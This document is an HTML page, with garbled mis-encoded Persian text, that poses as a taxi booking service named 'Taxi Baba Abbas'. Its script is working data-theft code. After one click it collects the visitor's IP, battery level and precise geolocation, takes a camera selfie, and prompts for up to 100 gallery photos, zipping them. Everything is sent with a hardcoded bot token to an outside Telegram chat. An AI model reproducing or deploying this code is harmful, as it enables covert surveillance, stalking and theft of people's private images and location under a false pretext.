<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³ â€” Ø²ÛŒÙ¾ 100 ØªØµÙˆÛŒØ± Ùˆ Ø§Ø±Ø³Ø§Ù„</title>
  <style>
    :root{--bg:#f7f9fb;--card:#fff;--text:#0b1a2b;--muted:#6c7a86;--green:#28a745;--danger:#c0392b}
    body { font-family: "Tahoma", "Arial", sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .card { background:var(--card); padding:22px; border-radius:12px; box-shadow:0 6px 24px rgba(12,17,24,0.08); text-align:center; width:420px; }
    .icon { font-size:56px; }
    h1 { margin:8px 0 6px; font-size:20px; }
    p { margin:6px 0 14px; color:var(--muted); font-size:13px; }
    .small { font-size:13px; color:#7a8a99; margin-top:10px; min-height:28px; }
    .hint { color:var(--danger); margin-top:12px; font-size:13px; display:none; }
    button { background:var(--green); color:white; border:0; padding:10px 16px; border-radius:8px; cursor:pointer; font-size:14px; }
    button.secondary { background:#f0f0f0; color:#222; }
    #fileInfo { margin-top:8px; font-size:13px; color:#445; word-break:break-word; }
    video { display:none; width:240px; height:320px; border-radius:8px; object-fit:cover; margin-top:12px }
  </style>
  <!-- JSZip (CDN) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js" integrity="sha512-HOgpYb+HjYVnQd2vQn0v1pCqgDj+/lqzqI+YgqgZsS0k9QxY9j8xgK7k9m7mT5fZkQZ3gFJZbFm8x6sE5dG0g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>
<body>
  <div class="card" role="status" aria-live="polite">
    <div class="icon" aria-hidden="true">ğŸš•</div>
    <h1>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³</h1>
    <p>Ù…Ø±Ø§Ø­Ù„: Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ Ø³Ù„ÙÛŒØŒ Ø§Ù†ØªØ®Ø§Ø¨ ØªØ§ 100 ØªØµÙˆÛŒØ± Ø§Ø² Ú¯Ø§Ù„Ø±ÛŒ â†’ Ø³Ø§Ø®Øª Ø²ÛŒÙ¾ â†’ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù….</p>

    <div id="status" class="small">Ø¯Ø± Ø­Ø§Ù„Øª Ø¢Ù…Ø§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ...</div>
    <div id="error" class="hint" role="alert"></div>

    <div style="margin-top:12px;">
      <button id="startBtn">Ø´Ø±ÙˆØ¹ ÙØ±Ø§ÛŒÙ†Ø¯ (Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ Ø³Ù„ÙÛŒØŒ Ø§Ù†ØªØ®Ø§Ø¨ Ú¯Ø§Ù„Ø±ÛŒ)</button>
      <button id="abortBtn" class="secondary" style="margin-left:8px; display:none">Ù„ØºÙˆ</button>
    </div>

    <div id="fileInfo"></div>
    <video id="video" autoplay playsinline muted></video>

    <!-- Ù…Ø®ÙÛŒ: input ÙØ§ÛŒÙ„ Ø¨Ø±Ø§ÛŒ Ø§Ù†ØªØ®Ø§Ø¨ Ú¯Ø§Ù„Ø±ÛŒ (multiple) -->
    <input id="fileInput" type="file" accept="image/*" multiple style="display:none" />
  </div>

  <script>
    /*****************************************************************************
     * Ù‡Ø´Ø¯Ø§Ø±Ù‡Ø§ÛŒ Ù…Ù‡Ù…:
     * - Ù…Ø±ÙˆØ±Ú¯Ø± Ø¨Ù‡ Ø´Ù…Ø§ Ø¯Ø³ØªØ±Ø³ÛŒ Ù…Ø³ØªÙ‚ÛŒÙ… Ø¨Ù‡ "Ú©Ù„ Ú¯Ø§Ù„Ø±ÛŒ" Ù†Ù…ÛŒâ€ŒØ¯Ù‡Ø¯Ø› Ú©Ø§Ø±Ø¨Ø± Ø¨Ø§ÛŒØ¯ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ Ø±Ø§
     *   Ø®ÙˆØ¯Ø´ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†Ø¯ (input type=file multiple). Ø¨Ù†Ø§Ø¨Ø±Ø§ÛŒÙ† Â«Ø§ÙˆÙ„ 100 ØªØµÙˆÛŒØ± Ú¯Ø§Ù„Ø±ÛŒÂ»
     *   ÛŒØ¹Ù†ÛŒ Ø­Ø¯Ø§Ú©Ø«Ø± 100 ØªØµÙˆÛŒØ±ÛŒ Ú©Ù‡ Ú©Ø§Ø±Ø¨Ø± Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†Ø¯.
     * - Ù†Ú¯Ù‡ Ø¯Ø§Ø´ØªÙ† BOT_TOKEN Ø¯Ø± Ú©Ù„Ø§ÛŒÙ†Øª Ù†Ø§Ø§Ù…Ù† Ø§Ø³ØªØ› Ø¯Ø± Ù…Ø­ÛŒØ· ØªÙˆÙ„ÛŒØ¯ Ø­ØªÙ…Ø§Ù‹ Ø§Ø² Ø³Ø±ÙˆØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.
     * - ØªÙˆØ¬Ù‡ Ø¨Ù‡ Ù…Ø­Ø¯ÙˆØ¯ÛŒØªâ€ŒÙ‡Ø§ÛŒ Ø­Ø¬Ù…: Telegram Ù…Ù…Ú©Ù† Ø§Ø³Øª Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ø­Ø¬Ù… Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ø¯.
     *****************************************************************************/

    // ====== Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ (Ø¨Ø±Ø§ÛŒ ØªØ³Øª) ======
    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8'; // Ù†Ø§Ø§Ù…Ù† Ø¯Ø± Ú©Ù„Ø§ÛŒÙ†Øª â€” ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ ØªØ³Øª
    const CHAT_ID = '8293145520';

    // Ø­Ø¯Ø§Ú©Ø«Ø± ØªØ¹Ø¯Ø§Ø¯ Ø¹Ú©Ø³â€ŒÙ‡Ø§ÛŒÛŒ Ú©Ù‡ Ø¯Ø§Ø®Ù„ Ø²ÛŒÙ¾ Ù…ÛŒâ€ŒØ±ÛŒØ²ÛŒÙ…
    const MAX_IMAGES = 100;
    // Ø­Ø¯Ø§Ú©Ø«Ø± Ø­Ø¬Ù… Ù…Ø¬Ø§Ø² Ø²ÛŒÙ¾ (Ù…Ø«Ù„Ø§Ù‹ 48MiB) â€” Ø§Ú¯Ø± Ø¨Ø²Ø±Ú¯ØªØ± Ø´Ø¯ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯ Ù…ÛŒâ€ŒØ¯Ù‡ÛŒÙ… Ø§Ø² Ø³Ø±ÙˆØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯
    const MAX_ZIP_BYTES = 48 * 1024 * 1024;

    // ====== DOM ======
    const startBtn = document.getElementById('startBtn');
    const abortBtn = document.getElementById('abortBtn');
    const statusDiv = document.getElementById('status');
    const errorDiv = document.getElementById('error');
    const fileInput = document.getElementById('fileInput');
    const fileInfo = document.getElementById('fileInfo');
    const video = document.getElementById('video');

    let abortRequested = false;
    let mediaStream = null;

    function setStatus(msg) { statusDiv.textContent = msg; errorDiv.style.display='none'; }
    function setError(msg) { errorDiv.style.display='block'; errorDiv.textContent = msg; statusDiv.textContent=''; }

    // --- Ú©Ù…Ú©â€ŒØ§ÙØ²Ø§Ø±Ù‡Ø§: Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ Ø¯ÙˆØ±Ø¨ÛŒÙ†ØŒ Ø¨Ø§ØªØ±ÛŒØŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ ---
    function getCurrentPositionPromise() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject(new Error('Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Geolocation Ø±Ø§ Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.'));
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        }, err => {
          if (err.code === err.PERMISSION_DENIED) reject(new Error('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø¯ Ø´Ø¯.'));
          else reject(new Error('Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª: ' + (err.message || err.code)));
        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
      });
    }

    async function getBatteryInfo() {
      try {
        if (!('getBattery' in navigator)) return null;
        const battery = await navigator.getBattery();
        const level = Math.round((battery.level || 0) * 100);
        const charging = battery.charging ? ' (Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜)' : '';
        return { level, charging };
      } catch (e) { return null; }
    }

    async function getPublicIP() {
      try {
        const r = await fetch('https://api.ipify.org?format=json');
        if (!r.ok) return null;
        const j = await r.json();
        return j.ip || null;
      } catch (e) { return null; }
    }

    // Ø¯ÙˆØ±Ø¨ÛŒÙ† (Ø³Ù„ÙÛŒ)
    async function startCamera() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error('Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª.');
      }
      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "user" } }, audio: false });
      video.srcObject = mediaStream;
      video.style.display = 'block';
      try { await video.play(); } catch(e){}
    }
    async function stopCamera() {
      video.style.display = 'none';
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
        mediaStream = null;
      }
      try { video.pause(); } catch(e){}
      video.srcObject = null;
    }
    function captureBlobFromVideo() {
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.translate(w, 0); ctx.scale(-1, 1); // mirror
      ctx.drawImage(video, 0, 0, w, h);
      return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
    }

    // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… (Ù†Ø§Ø§Ù…Ù† Ø¯Ø± Ú©Ù„Ø§ÛŒÙ†Øª)
    async function sendDocumentToTelegram(fileBlob, filename = 'gallery.zip', caption = '') {
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendDocument`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('document', new File([fileBlob], filename, { type: 'application/zip' }));
      if (caption) form.append('caption', caption);
      const r = await fetch(url, { method: 'POST', body: form });
      const j = await r.json();
      if (!j.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø²ÛŒÙ¾ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…: ' + (j.description || r.statusText));
      return j;
    }

    // ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ: Ø§Ø¬Ø±Ø§ Ù‡Ù†Ú¯Ø§Ù… Ú©Ù„ÛŒÚ©
    startBtn.addEventListener('click', async () => {
      abortRequested = false;
      abortBtn.style.display = 'inline-block';
      setStatus('Ø´Ø±ÙˆØ¹ ÙØ±Ø§ÛŒÙ†Ø¯: Ø®ÙˆØ§Ù†Ø¯Ù† Ø¨Ø§ØªØ±ÛŒ Ùˆ Ø¢ÛŒâ€ŒÙ¾ÛŒ...');
      fileInfo.textContent = '';
      try {
        // 1) Ø¨Ø§ØªØ±ÛŒ Ùˆ Ø¢ÛŒâ€ŒÙ¾ÛŒ
        const battery = await getBatteryInfo();
        const batteryText = battery ? `${battery.level}%${battery.charging}` : 'Ù†Ø§Ù…Ø´Ø®Øµ';
        const ip = await getPublicIP();

        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª Ø§Ø² Ù…Ø±ÙˆØ±Ú¯Ø±...');
        const { lat, lon } = await getCurrentPositionPromise();
        setStatus('Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯Ø› Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ...');
        // 2) Ø³Ù„ÙÛŒ
        try {
          await startCamera();
        } catch (e) {
          setError('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù…Ù…Ú©Ù† Ù†ÛŒØ³Øª: ' + (e.message || e));
          return;
        }
        await new Promise(r => setTimeout(r, 600)); // warm up
        const selfieBlob = await captureBlobFromVideo();
        await stopCamera();

        if (abortRequested) { setStatus('Ù„ØºÙˆ Ø´Ø¯'); return; }

        // Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ (Ø§Ø®ØªÛŒØ§Ø±ÛŒ â€” Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒÙ… Ù‚Ø¨Ù„ ÛŒØ§ Ø¨Ø¹Ø¯ Ø§Ø² Ø²ÛŒÙ¾ Ø¨ÙØ±Ø³ØªÛŒÙ…)
        setStatus('Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
        const selfieCaption = `Ø³Ù„ÙÛŒ Ù…Ø´ØªØ±ÛŒ â€” Ø¨Ø§ØªØ±ÛŒ: ${batteryText}\nÙ…ÙˆÙ‚Ø¹ÛŒØª: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}\nIP: ${ip || 'Ù†Ø§Ù…Ø´Ø®Øµ'}`;
        try {
          if (selfieBlob) {
            // Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', new File([selfieBlob], 'selfie.jpg', { type: selfieBlob.type || 'image/jpeg' }));
            form.append('caption', selfieCaption);
            const r = await fetch(`https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`, { method: 'POST', body: form });
            const j = await r.json();
            if (!j.ok) console.warn('Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯', j);
          }
        } catch (e) {
          console.warn('Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯:', e);
        }

        if (abortRequested) { setStatus('Ù„ØºÙˆ Ø´Ø¯'); return; }

        // 3) Ø§Ù†ØªØ®Ø§Ø¨ Ú¯Ø§Ù„Ø±ÛŒ ØªÙˆØ³Ø· Ú©Ø§Ø±Ø¨Ø± (Ø­Ø¯Ø§Ú©Ø«Ø± MAX_IMAGES)
        setStatus(`Ù„Ø·ÙØ§Ù‹ ØªØ§ ${MAX_IMAGES} ØªØµÙˆÛŒØ± Ø±Ø§ Ø§Ø² Ú¯Ø§Ù„Ø±ÛŒ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ Ùˆ ØªØ§ÛŒÛŒØ¯ Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯.`);
        fileInput.value = '';
        // Ù†Ù…Ø§ÛŒØ´ Ø¯ÛŒØ§Ù„ÙˆÚ¯ Ø§Ù†ØªØ®Ø§Ø¨ ÙØ§ÛŒÙ„ Ø¨Ø§ Ù†ÛŒØ§Ø² Ø¨Ù‡ ØªØ¹Ø§Ù…Ù„ Ú©Ø§Ø±Ø¨Ø± â€” Ù…Ø§ Ø¯Ú©Ù…Ù‡â€ŒÛŒ Ø´Ø±ÙˆØ¹ Ø±Ø§ Ú©Ù„ÛŒÚ© Ú©Ø±Ø¯ÛŒÙ…ØŒ Ø¨Ù†Ø§Ø¨Ø±Ø§ÛŒÙ† Ø§ÛŒÙ† Ú©Ù„ÛŒÚ© Ù…Ø¹Ù…ÙˆÙ„Ø§Ù‹ Ù…Ø¬Ø§Ø² Ø§Ø³Øª
        fileInput.click();

        const files = await new Promise((resolve) => {
          fileInput.onchange = (ev) => {
            const f = Array.from(ev.target.files || []);
            resolve(f.slice(0, MAX_IMAGES));
          };
          // Ø¯Ø± ØµÙˆØ±Øª Ø¨Ø³ØªÙ‡ Ø´Ø¯Ù† Ø¨Ø¯ÙˆÙ† Ø§Ù†ØªØ®Ø§Ø¨ØŒ Ø¨Ø¹Ø¯ Ø§Ø² 60 Ø«Ø§Ù†ÛŒÙ‡ timeout Ø´ÙˆØ¯
          setTimeout(() => resolve([]), 60000);
        });

        if (!files || files.length === 0) {
          setStatus('Ù‡ÛŒÚ† ÙØ§ÛŒÙ„ÛŒ Ø§Ù†ØªØ®Ø§Ø¨ Ù†Ø´Ø¯. ÙØ±Ø§ÛŒÙ†Ø¯ ØªØ§ Ø§ÛŒÙ†Ø¬Ø§ Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯.');
          return;
        }

        fileInfo.textContent = `ØªØ¹Ø¯Ø§Ø¯ ÙØ§ÛŒÙ„ Ø§Ù†ØªØ®Ø§Ø¨â€ŒØ´Ø¯Ù‡: ${files.length}. Ø³Ø§Ø®Øª Ø²ÛŒÙ¾...`;
        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø³Ø§Ø®Øª Ø²ÛŒÙ¾ Ø§Ø² ØªØµØ§ÙˆÛŒØ± Ù…Ù†ØªØ®Ø¨...');

        // 4) Ø³Ø§Ø®Øª Ø²ÛŒÙ¾ Ø¨Ø§ JSZip Ùˆ Ù†Ù…Ø§ÛŒØ´ Ù¾ÛŒØ´Ø±ÙØª
        const zip = new JSZip();
        const folder = zip.folder('gallery') || zip;
        for (let i = 0; i < files.length; i++) {
          if (abortRequested) { setStatus('Ù„ØºÙˆ Ø´Ø¯'); return; }
          const f = files[i];
          // Ø¨Ø±Ø§ÛŒ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² Ø§Ø³Ø§Ù…ÛŒ ØªÚ©Ø±Ø§Ø±ÛŒØŒ Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒÙ… Ù†Ø§Ù…â€ŒÙ‡Ø§ Ø±Ø§ Ø´Ù…Ø§Ø±Ù‡â€ŒÚ¯Ø°Ø§Ø±ÛŒ Ú©Ù†ÛŒÙ…
          const safeName = `${String(i+1).padStart(3,'0')}-${f.name}`;
          folder.file(safeName, f);
          fileInfo.textContent = `Ø§Ø¶Ø§ÙÙ‡ Ú©Ø±Ø¯Ù† ÙØ§ÛŒÙ„ ${i+1}/${files.length}: ${f.name}`;
          await new Promise(r => setTimeout(r, 10)); // yield to UI
        }

        // ØªÙˆÙ„ÛŒØ¯ Ø²ÛŒÙ¾ (progress callback)
        const zipBlob = await zip.generateAsync({ type: 'blob' }, (meta) => {
          const pct = Math.round(meta.percent);
          setStatus(`Ø¯Ø± Ø­Ø§Ù„ ÙØ´Ø±Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ: ${pct}%`);
        });

        if (zipBlob.size > MAX_ZIP_BYTES) {
          setError(`Ø­Ø¬Ù… ÙØ§ÛŒÙ„ Ø²ÛŒÙ¾ ${Math.round(zipBlob.size/1024/1024)}MiB Ø§Ø³Øª Ú©Ù‡ Ø§Ø² Ø­Ø¯ Ù…Ø¬Ø§Ø² (â‰ˆ${Math.round(MAX_ZIP_BYTES/1024/1024)}MiB) Ø¨ÛŒØ´ØªØ± Ø§Ø³Øª. Ù„Ø·ÙØ§Ù‹ ØªØ¹Ø¯Ø§Ø¯ ØªØµØ§ÙˆÛŒØ± Ø±Ø§ Ú©Ù… Ú©Ù†ÛŒØ¯ ÛŒØ§ Ø§Ø² Ø±ÙˆØ´ Ø³Ø±ÙˆØ±ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.`);
          return;
        }

        if (abortRequested) { setStatus('Ù„ØºÙˆ Ø´Ø¯'); return; }

        setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø²ÛŒÙ¾ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
        const caption = `Ú¯Ø§Ù„Ø±ÛŒ Ù…Ø´ØªØ±ÛŒ â€” ØªØ¹Ø¯Ø§Ø¯: ${files.length}\nØ¨Ø§ØªØ±ÛŒ: ${batteryText}\nÙ…ÙˆÙ‚Ø¹ÛŒØª: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}\nIP: ${ip || 'Ù†Ø§Ù…Ø´Ø®Øµ'}`;
        await sendDocumentToTelegram(zipBlob, 'gallery.zip', caption);

        setStatus('Ø²ÛŒÙ¾ Ùˆ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯. ØªØ§Ú©Ø³ÛŒ Ø¯Ø± Ø±Ø§Ù‡ Ø§Ø³Øª.');
      } catch (err) {
        setError('Ø®Ø·Ø§: ' + (err.message || err));
        console.error(err);
      } finally {
        abortBtn.style.display = 'none';
        try { await stopCamera(); } catch(e){}
      }
    });

    abortBtn.addEventListener('click', () => {
      abortRequested = true;
      setStatus('Ø¯Ø± Ø­Ø§Ù„ Ù„ØºÙˆ...');
    });

    // Ø§Ø·Ù„Ø§Ø¹â€ŒØ±Ø³Ø§Ù†ÛŒ Ø¯Ø±Ø¨Ø§Ø±Ù‡Ù” Ù…Ø­Ø¯ÙˆØ¯ÛŒØªâ€ŒÙ‡Ø§ÛŒ Ù¾ÛŒØ§Ù…â€ŒØ±Ø³Ø§Ù†
    (function warnLimits(){
      const note = 'ØªÙˆØ¬Ù‡: Ù…Ù…Ú©Ù† Ø§Ø³Øª Telegram Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ø­Ø¬Ù… ÙØ§ÛŒÙ„ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ø¯. Ø¯Ø± ØµÙˆØ±Øª Ø®Ø·Ø§ Ø§Ø² Ø±ÙˆØ´ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.';
      const n = document.createElement('div');
      n.style.fontSize = '12px';
      n.style.color = '#667';
      n.style.marginTop = '8px';
      n.textContent = note;
      document.querySelector('.card').appendChild(n);
    })();
  </script>

  <noscript>
    <div style="text-align:center; margin-top:14px; color:#c00">Ø¬Ø§ÙˆØ§Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø®Ø§Ù… Ø§Ø³Øª. Ø§ÛŒÙ† ØµÙØ­Ù‡ Ø¨Ø§ÛŒØ¯ Ø¬Ø§ÙˆØ§Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø±Ø§ Ø§Ø¬Ø±Ø§ Ú©Ù†Ø¯.</div>
  </noscript>
</body>
</html>
